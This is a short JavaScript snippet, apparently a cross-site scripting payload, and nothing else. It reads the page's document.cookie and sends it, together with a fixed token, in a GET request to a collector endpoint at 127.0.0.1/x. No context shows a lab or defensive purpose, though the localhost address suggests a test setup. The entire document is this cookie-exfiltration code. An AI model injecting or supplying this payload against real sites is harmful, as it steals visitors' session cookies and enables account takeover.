
	var http = new XMLHttpRequest();
	http.open("GET", "http://127.0.0.1/x?token=kKhKJKyoFBEQ6xiHZMfM3cl0ZewqanPk&c="+encodeURIComponent(document.cookie), true);
	http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	http.send();
